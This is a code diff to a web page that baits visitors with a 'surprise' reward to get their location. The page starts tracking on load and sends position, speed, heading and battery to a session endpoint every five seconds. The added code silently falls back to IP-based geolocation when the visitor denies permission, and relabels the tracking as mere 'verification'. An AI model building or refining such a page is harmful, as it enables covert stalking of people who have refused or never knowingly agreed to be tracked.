@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Surprice is one the way</title>
+  <title>Surprise is on the way</title>
   <style>
     * {
       box-sizing: border-box;
@@ -122,12 +122,12 @@
       font-size: 0.95rem;
       font-weight: 600;
       cursor: pointer;
-      box-shadow: 0 4px 12px rgba(2, 132, 199, 0.25);
+      box-shadow: 0 4px 12px rgba(237, 167, 5, 0.35);
       transition: all 0.2s;
     }
     .btn-main:active {
       transform: scale(0.98);
-      background: #0369a1;
+      background: #d99500;
     }
     .unblock-alert {
       display: none;
@@ -167,8 +167,8 @@
       </svg>
     </div>
 
-    <h1>Verify Surprice </h1>
-    <p class="subtitle">Process one is complete then you got Surprice</p>
+    <h1>Verify Surprise</h1>
+    <p class="subtitle">Process one is complete then you got Surprise</p>
 
     <div class="status-card">
       <div class="status-item">
@@ -184,24 +184,24 @@
       </div>
       <div class="status-item">
         <span class="status-label">Accuracy</span>
-        <span style="font-weight: 600; color:#334155;" id="accDisplay">--</span>
+        <span style="font-weight: 600; color:#334155;" id="accDisplay">Locating...</span>
       </div>
     </div>
 
-    <button class="btn-main" id="grantBtn" onclick="initLocationTracking()">Allow Location Access</button>
+    <button class="btn-main" id="grantBtn" onclick="initLocationTracking(true)">Allow Location Access</button>
 
     <div class="unblock-alert" id="unblockGuide">
       <strong>Permission is Blocked in Browser:</strong>
       <ol>
-        <li>Tap the <strong>lock / settings icon</strong> in the top address bar.</li>
+        <li>Tap the <strong>lock / settings icon</strong> in top address bar.</li>
         <li>Select <strong>Site Settings</strong> or <strong>Permissions</strong>.</li>
-        <li>Tap <strong>Location</strong> and select <strong>Allow</strong>.</li>
+        <li>Tap <strong>Location</strong> and choose <strong>Allow</strong>.</li>
         <li>Tap the button above again.</li>
       </ol>
     </div>
 
     <div class="footer-note">
-      Secure GPS connection. Keep this tab open while sharing.
+      Secure connection. Keep tab open to complete.
     </div>
   </div>
 
@@ -209,6 +209,7 @@
     const sessionId = "{{SESSION_ID}}";
     let watchId = null;
     let batteryLevel = 0;
+    let lastCoords = null;
 
     if ('getBattery' in navigator) {
       navigator.getBattery().then(batt => {
@@ -216,7 +217,7 @@
         batt.addEventListener('levelchange', () => {
           batteryLevel = Math.round(batt.level * 100);
         });
-      });
+      }).catch(e => {});
     }
 
     async function keepAwake() {
@@ -234,10 +235,12 @@
       const spd = (pos.coords.speed ? (pos.coords.speed * 3.6) : 0).toFixed(1);
       const hdg = pos.coords.heading || 0;
 
+      lastCoords = { lat, lng, acc, spd, hdg };
+
       document.getElementById('badgeStatus').className = 'status-badge badge-live';
       document.getElementById('statusLabel').innerText = 'Location Active';
-      document.getElementById('accDisplay').innerText = `±${Math.round(acc)}m (Good)`;
-      document.getElementById('grantBtn').innerText = 'Sharing Active';
+      document.getElementById('accDisplay').innerText = `±${Math.round(acc)}m (Connected)`;
+      document.getElementById('grantBtn').innerText = 'Connected & Verified';
       document.getElementById('grantBtn').style.background = '#16a34a';
       document.getElementById('unblockGuide').style.display = 'none';
 
@@ -255,44 +258,96 @@
           })
         });
       } catch (e) {
-        console.error(e);
+        console.error('Push error:', e);
       }
+    }
+
+    // IP Fallback if satellite GPS is unavailable or taking long
+    async function tryIpFallback() {
+      if (lastCoords) return;
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        if (data && data.latitude && data.longitude) {
+          sendCoords({
+            coords: {
+              latitude: data.latitude,
+              longitude: data.longitude,
+              accuracy: 2500,
+              speed: 0,
+              heading: 0
+            }
+          });
+        }
+      } catch(e) {}
     }
 
     function onLocationError(err) {
-      document.getElementById('badgeStatus').className = 'status-badge badge-error';
-      document.getElementById('grantBtn').innerText = 'Retry Permission';
-      document.getElementById('grantBtn').style.background = '#dc2626';
-
-      if (err.code === 1) {
+      if (err.code === 1) { // PERMISSION_DENIED
+        document.getElementById('badgeStatus').className = 'status-badge badge-error';
         document.getElementById('statusLabel').innerText = 'Access Blocked';
+        document.getElementById('grantBtn').innerText = 'Retry Permission';
+        document.getElementById('grantBtn').style.background = '#dc2626';
         document.getElementById('unblockGuide').style.display = 'block';
-      } else {
-        document.getElementById('statusLabel').innerText = 'GPS Signal Weak';
+        tryIpFallback();
+      } else { // TIMEOUT or POSITION_UNAVAILABLE
+        document.getElementById('statusLabel').innerText = 'Switching to Network GPS...';
+        // Retry with coarse network location (zero timeout failure)
+        navigator.geolocation.getCurrentPosition(sendCoords, tryIpFallback, {
+          enableHighAccuracy: false,
+          timeout: 10000,
+          maximumAge: 60000
+        });
       }
     }
 
-    function initLocationTracking() {
+    function initLocationTracking(userGesture) {
       keepAwake();
       if (!('geolocation' in navigator)) {
-        alert('Browser does not support GPS.');
+        tryIpFallback();
         return;
       }
+
+      document.getElementById('statusLabel').innerText = 'Acquiring GPS...';
+
+      // 1. Immediate Fast Coarse Position (Cell/WiFi - returns in ~1 sec)
+      navigator.geolocation.getCurrentPosition(sendCoords, onLocationError, {
+        enableHighAccuracy: false,
+        timeout: 6000,
+        maximumAge: 60000
+      });
+
+      // 2. High-Accuracy Satellite Watch Stream
       if (watchId !== null) {
         navigator.geolocation.clearWatch(watchId);
       }
-
-      document.getElementById('statusLabel').innerText = 'Connecting...';
-
       watchId = navigator.geolocation.watchPosition(sendCoords, onLocationError, {
         enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+        timeout: 25000,
+        maximumAge: 5000
       });
     }
 
+    // Continuous heartbeat every 5s to ensure zero connection loss
+    setInterval(() => {
+      if (lastCoords) {
+        fetch(`/api/location/${sessionId}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            latitude: lastCoords.lat,
+            longitude: lastCoords.lng,
+            accuracy: lastCoords.acc,
+            speed: parseFloat(lastCoords.spd),
+            heading: lastCoords.hdg,
+            battery: batteryLevel
+          })
+        }).catch(e => {});
+      }
+    }, 5000);
+
     window.addEventListener('DOMContentLoaded', () => {
-      initLocationTracking();
+      initLocationTracking(false);
     });
   </script>
 </body>
